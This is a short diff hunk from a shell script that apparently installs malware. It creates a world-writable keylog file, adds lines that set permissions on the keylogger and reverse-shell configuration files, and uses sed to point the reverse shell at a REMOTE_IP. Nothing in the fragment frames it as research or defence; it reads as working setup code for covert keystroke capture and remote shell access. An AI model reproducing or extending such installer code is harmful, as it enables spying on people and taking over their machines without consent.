@@ -78,6 +78,10 @@ echo ">> Creating keylog file."
 touch $KEYLOG_LOG_FILE
 chmod 666 $KEYLOG_LOG_FILE
 
+echo ">> Enforcing permissions."
+chmod 755 $BINARIES/$RSHELL_CONF_FILE
+chmod 755 $BINARIES/$KEYLOG_CONF_FILE
+
 echo ">> Editing rshell conf file to contain REMOTE_IP=${REMOTE_IP}."
 sed -i '' "s|${USR_SBIN}${RSHELL}|${USR_SBIN}${RSHELL} ${REMOTE_IP}|g" $BINARIES/$RSHELL_CONF_FILE
 
